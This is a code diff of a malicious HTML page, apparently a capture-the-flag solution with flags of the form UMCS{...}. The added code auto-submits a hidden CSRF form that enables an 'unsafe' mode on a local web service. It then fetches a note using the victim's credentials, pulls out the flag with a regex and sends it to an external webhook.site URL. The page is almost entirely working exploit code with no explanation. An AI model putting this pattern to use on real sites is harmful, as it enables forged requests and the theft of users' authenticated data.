@@ -1,15 +1,25 @@
-<!DOCTYPE html>
 <html>
-<head>
-    <title>Attack Page</title>
-</head>
-<body>
-    <form id="unsafeForm" action="http://127.0.0.1:7189/prefs/unsafe" method="POST">
-        <input type="hidden" name="id" value="1">
-        <input type="hidden" name="enable" value="1">
+  <body>
+    <!-- STEP 1: Enable Unsafe Mode (CSRF) -->
+    <form id="enableUnsafe" action="http://127.0.0.1:7189/prefs/unsafe" method="POST" style="display:none;">
+      <input type="hidden" name="id" value="1">
+      <input type="hidden" name="enable" value="1">
     </form>
+
+    <!-- STEP 2: Fetch the note and exfiltrate -->
     <script>
-        document.getElementById('unsafeForm').submit();
+      // Submit the form to enable unsafe mode
+      document.getElementById('enableUnsafe').submit();
+
+      // Wait 2 seconds, then fetch the note and send to webhook
+      setTimeout(() => {
+        fetch('http://127.0.0.1:7189/notes/1', { credentials: 'include' })
+          .then(resp => resp.text())
+          .then(html => {
+            const flag = html.match(/UMCS\{.*?\}/)[0]; // Extract flag
+            fetch('https://webhook.site/d1b4da46-4ad8-4ec4-8241-bcdbcefd6aa0?flag=' + flag);
+          });
+      }, 2000);
     </script>
-</body>
+  </body>
 </html>
